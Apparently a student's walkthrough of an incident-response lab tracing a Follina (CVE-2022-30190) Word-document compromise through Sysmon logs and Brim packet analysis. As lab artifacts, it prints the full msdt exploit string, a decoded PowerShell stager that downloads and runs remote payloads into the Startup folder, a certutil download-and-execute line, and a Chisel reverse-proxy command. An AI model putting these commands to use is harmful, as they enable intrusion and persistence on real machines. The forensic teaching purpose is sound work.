## Short Note: Preparing Artifacts & Tools

Before investigation, first verify evidence integrity by comparing file hashes. Use PowerShell:

```powershell
cd '.\Desktop\Incident Files\'
ls
Get-FileHash -Algorithm SHA256 .\capture.pcapng
```

Main artifacts:

```text
capture.pcapng
sysmon.evtx
windows.evtx
```

Tools used:

```text
Endpoint logs: EvtxEcmd, Timeline Explorer, SysmonView, Event Viewer
Network logs: Wireshark, Brim
```

### EvtxEcmd + Timeline Explorer

`EvtxEcmd` converts Windows/Sysmon `.evtx` logs into CSV:

```powershell
.\EvtxECmd.exe -f 'C:\Users\user\Desktop\Incident Files\sysmon.evtx' --csv 'C:\Users\user\Desktop\Incident Files' --csvf sysmon.csv
```

Then open `sysmon.csv` in **Timeline Explorer** to filter, search, and analyze events easily.

### SysmonView

`SysmonView` visualizes Sysmon activity. First export Sysmon logs as XML using **Event Viewer**, then import the XML into SysmonView.

It helps correlate events related to a specific process, such as process creation, network connections, file creation, and registry activity.
---
## Short Summary: Tempest Incident

In this part, I investigated a **critical incident** where the user **benimaru** on machine **TEMPEST** was compromised through a malicious Word document:

```text
free_magicules.doc
```

The document was opened by **Microsoft Word** with PID:

```text
496
```

The attack used a malicious domain:

```text
phishteam.xyz
```

Sysmon DNS logs showed it resolved to:

```text
167.71.199.191
```

The document executed a Base64-encoded PowerShell payload:

```text
JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==
```

When decoded, it downloads `update.zip` from the attacker server, extracts it into the Windows **Startup folder**, and deletes the zip file. This gives the attacker persistence.

The vulnerability used was:

```text
CVE-2022-30190 / Follina
```

It is a Microsoft Office/MSDT remote code execution vulnerability.

---

## Useful Commands / Investigation Steps

Parse Sysmon EVTX to CSV:

```powershell
.\EvtxECmd.exe -f "C:\Users\user\Desktop\Incident Files\sysmon.evtx" --csv "C:\Users\user\Desktop\Incident Files" --csvf sysmon.csv
```

Search for the malicious document:

```text
free_magicules.doc
```

Search for Word process activity:

```text
winword.exe
```

Check child processes using:

```text
ParentProcessId = 496
```

Search DNS queries:

```text
Event ID 22
QueryName = phishteam.xyz
```

Decode Base64 in PowerShell:

```powershell
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("BASE64_STRING"))
```

---

## What I Learned

I learned how to investigate a malicious Office document using **Sysmon logs**, especially:

```text
Event ID 1  = Process Creation
Event ID 22 = DNS Query
```

The main investigation technique was to follow the process chain:

```text
chrome.exe → winword.exe → malicious command execution
```

I also learned that attackers can use **Follina CVE-2022-30190** to make a Word document execute PowerShell commands, download payloads, and create persistence through the Windows Startup folder.
---
This is a Follina exploit command:
C:\Windows\SysWOW64\msdt.exe ms-msdt:/id PCWDiagnostic /skip force /param "IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg=='+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe"
This is a **Follina exploit command**:

```text
CVE-2022-30190
Microsoft MSDT Remote Code Execution
```

It shows that a malicious Word document executed `msdt.exe` and abused it to run PowerShell code.

## What happened exactly

The malicious document caused this process to run:

```text
C:\Windows\SysWOW64\msdt.exe
```

`msdt.exe` is the **Microsoft Support Diagnostic Tool**. Normally it is legitimate, but in **Follina**, attackers abuse the `ms-msdt:` protocol to execute commands.

The important part is this:

```text
ms-msdt:/id PCWDiagnostic
```

This launches the **Program Compatibility Troubleshooter** through MSDT.

Then this part injects malicious PowerShell:

```text
Invoke-Expression(...)
```

`Invoke-Expression` means: **execute this string as PowerShell code**.

Inside it, there is a Base64 string:

```text
JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRo...
```

When decoded, it becomes:

```powershell
$app=[Environment]::GetFolderPath('ApplicationData');
cd "$app\Microsoft\Windows\Start Menu\Programs\Startup";
iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip;
Expand-Archive .\update.zip -DestinationPath .;
rm update.zip;
```

## Meaning of the decoded payload

```powershell
$app=[Environment]::GetFolderPath('ApplicationData')
```

Gets the user’s AppData/Roaming folder.

```powershell
cd "$app\Microsoft\Windows\Start Menu\Programs\Startup"
```

Moves to the Windows **Startup folder**.

Anything placed here can run automatically when the user logs in.

```powershell
iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip
```

Downloads a ZIP payload from the attacker domain.

`iwr` = `Invoke-WebRequest`.

```powershell
Expand-Archive .\update.zip -DestinationPath .
```

Extracts the ZIP file into the Startup folder.

```powershell
rm update.zip
```

Deletes the ZIP file to reduce evidence.

## Why it is malicious

The attacker used a Word document to run:

```text
WINWORD.EXE → msdt.exe → PowerShell payload
```

Then the payload downloaded files from:

```text
phishteam.xyz
```

and placed them in:

```text
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
```

That means the attacker was trying to achieve **persistence**, so the payload would run again after login/restart.

## What to look for in logs

In Sysmon:

```text
Event ID 1  = Process Creation
Event ID 11 = File Creation
Event ID 22 = DNS Query
```

Look for:

```text
msdt.exe
phishteam.xyz
update.zip
Startup
WINWORD.EXE as parent process
```

Final summary: this command is a **Follina CVE-2022-30190 exploitation chain** where a malicious Word document abused `msdt.exe` to execute Base64 PowerShell, download `update.zip`, extract it into the Startup folder, and create persistence.
---
## Short Summary: Malicious Document — Stage 2

In Stage 2, the malicious Word document already executed a **Base64 PowerShell command**. After decoding it, we saw that it downloaded `update.zip` from the attacker domain and extracted it into the user’s **Startup folder**.

This means the attacker created **persistence**: when the compromised user logs in again, Windows runs the implanted payload automatically.

---

### 1. Payload written path

The decoded command showed the payload was written into the Startup folder:

```text
C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

How I found it:

```text
Decoded Base64 payload → checked cd path → saw Startup folder
```

Answer:

```text
C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

---

### 2. Command executed after user login

To find this, I opened `sysmon.csv` in **Timeline Explorer**.

Steps:

```text
Filter EventId = 1
Search explorer.exe
Check child process CommandLine
```

Because Startup-folder payloads usually run with:

```text
Parent process: explorer.exe
```

Answer:

```text
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe
```

This command runs PowerShell hidden, uses `certutil` to download `first.exe`, saves it in Public Downloads, then executes it.

---

### 3. SHA256 hash of Stage 2 binary

To find the hash, I used Timeline Explorer again.

Steps:

```text
Filter EventId = 1
Search first.exe
Check Hashes field
Find SHA256 value
```

Answer:

```text
CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8
```

---

### 4. Stage 2 C2 domain and port

After `first.exe` executed, I checked Sysmon network/DNS activity.

Look for:

```text
EventId = 3   Network connection
EventId = 22  DNS query
Search first.exe
Search resolvecyber.xyz
```

The payload connected to:

```text
resolvecyber.xyz
```

on port:

```text
80
```

Answer:

```text
resolvecyber.xyz:80
```

---

## What I Learned

I learned how Stage 2 malware works after a malicious document exploit:

```text
Malicious document
→ Base64 PowerShell execution
→ Payload written to Startup folder
→ User logs in
→ explorer.exe runs Startup payload
→ PowerShell downloads first.exe using certutil
→ first.exe executes
→ connects to C2 server resolvecyber.xyz:80
```

Important Sysmon events:

```text
Event ID 1  = Process Creation
Event ID 3  = Network Connection
Event ID 11 = File Creation
Event ID 22 = DNS Query
```

Main lesson: attackers often use the **Startup folder** for persistence and legitimate Windows tools like **PowerShell** and **certutil.exe** to download and execute payloads.
---
## Short Note: Malicious Document Traffic — Brim Analysis

In this part, I used **Brim** to analyze the packet capture `capture.pcapng`. From Sysmon, we already knew the malicious domains:

```text
phishteam.xyz
resolvecyber.xyz
```

So in Brim, I searched HTTP traffic related to these domains.

---

### 1. Malicious payload URL embedded in the document

Brim filter:

```zed
_path=="http" && host=="phishteam.xyz"
```

I checked the `host` and `uri` fields, then combined them:

```text
host = phishteam.xyz
uri  = /02dcf07/index.html
```

Answer:

```text
http://phishteam.xyz/02dcf07/index.html
```

---

### 2. Encoding used on the C2 connection

In the HTTP traffic, the command/result data appeared encoded. The value matched **Base64** format.

Answer:

```text
base64
```

---

### 3. Parameter used to send command results

Brim filter:

```zed
_path=="http" && host=="resolvecyber.xyz"
```

I checked the HTTP `uri` field and saw the payload/result being sent through a URL parameter:

```text
?q=...
```

Answer:

```text
q
```

---

### 4. URL used by the binary to get commands

The Stage 2 binary connected to the C2 server to receive commands. In Brim, the HTTP request showed this URI:

```text
/9ab62b5
```

Answer:

```text
/9ab62b5
```

---

### 5. HTTP method used by the binary

In the same HTTP event, I checked the `method` field.

Answer:

```text
GET
```

---

### 6. Programming language used to compile the binary

The HTTP `user_agent` field showed:

```text
Nim httpclient/1.6.6
```

This means the binary was likely written in **Nim** and used Nim’s HTTP client library.

Answer:

```text
nim
```

---

## What I Learned

I learned how to use **Brim** to investigate malware network traffic from a PCAP:

```text
Search malicious domains
Filter HTTP traffic
Check host + uri for full URLs
Check method for HTTP action
Check parameters for exfiltrated command output
Check user_agent to identify malware language/tooling
```

Useful Brim filters:

```zed
_path=="http" AND host=="phishteam.xyz"
```

```zed
_path=="http" AND host=="resolvecyber.xyz"
```

```zed
_path=="http" AND id.resp_h==167.71.222.162
```

Main idea:

```text
Sysmon showed the domains/IPs.
Brim showed the real HTTP communication, URLs, parameters, method, and User-Agent.
```
---
## Short Note: Internal Reconnaissance

In this stage, the Stage 2 malware was communicating with the C2 server and sending/receiving encoded commands. Using **Brim**, I checked HTTP traffic to the malicious C2 domain and decoded Base64 values to understand the attacker’s commands and outputs.

### Brim filter for C2 traffic

```zed id="91mlbe"
_path=="http" "resolvecyber.xyz" id.resp_p==80 | cut ts, host, id.resp_p, uri | sort ts
```

I looked for encoded values in the URI, especially the `q=` parameter, then decoded them.

### Decode Base64

PowerShell:

```powershell id="0jq1vc"
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("BASE64_HERE"))
```

Linux:

```bash id="3fvpgx"
echo 'BASE64_HERE' | base64 -d
```

---

## Answers and How They Were Found

### 1. Password found in sensitive file

Decoded C2 traffic showed the attacker discovered a sensitive file containing the password.

Answer:

```text id="3fyi87"
infernotempest
```

---

### 2. Listening port for remote shell

Decoded enumeration output showed open/listening ports. Port `5985` is used by **WinRM**, which can provide remote command execution.

Answer:

```text id="a62mot"
5985
```

---

### 3. Reverse SOCKS proxy command

In **Timeline Explorer**, I filtered:

```text id="ng4gja"
EventId = 1
```

Then searched:

```text id="iiv97v"
socks
```

or:

```text id="3xz5rf"
ch.exe
```

The command found was:

```text id="sks1tv"
C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks
```

This created a reverse SOCKS proxy so the attacker could access internal services through the victim machine.

---

### 4. SHA256 hash of reverse SOCKS binary

In the same `ch.exe` Sysmon Event ID 1 process event, I checked the `Hashes` field.

Answer:

```text id="bl119e"
8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451
```

---

### 5. Tool name from hash

The hash identified the tool as **Chisel**, a tunneling/proxy tool often abused for pivoting.

Answer:

```text id="b4r259"
chisel
```

---

### 6. Service used to authenticate

After the SOCKS proxy execution, I checked succeeding process events. WinRM activity may appear as:

```text id="weo3v0"
wsmprovhost.exe
```

WinRM uses port:

```text id="nc7vdh"
5985
```

Answer:

```text id="f1jzqv"
winrm
```

---

## Main Concept Learned

The attacker used C2 traffic to run commands, decode results, find credentials, enumerate open ports, and then create a reverse SOCKS proxy using Chisel.

Attack flow:

```text id="b3wp8e"
Stage 2 malware
→ communicates with resolvecyber.xyz:80
→ sends/receives Base64 encoded commands
→ attacker finds password infernotempest
→ attacker finds WinRM port 5985
→ attacker runs ch.exe / Chisel reverse SOCKS proxy
→ attacker authenticates using WinRM
```

Key tools/events:

```text id="fvqp03"
Brim = analyze HTTP C2 traffic
Sysmon Event ID 1 = process creation
Sysmon Hashes field = identify binary
WinRM / wsmprovhost.exe = remote authentication/execution
```
---

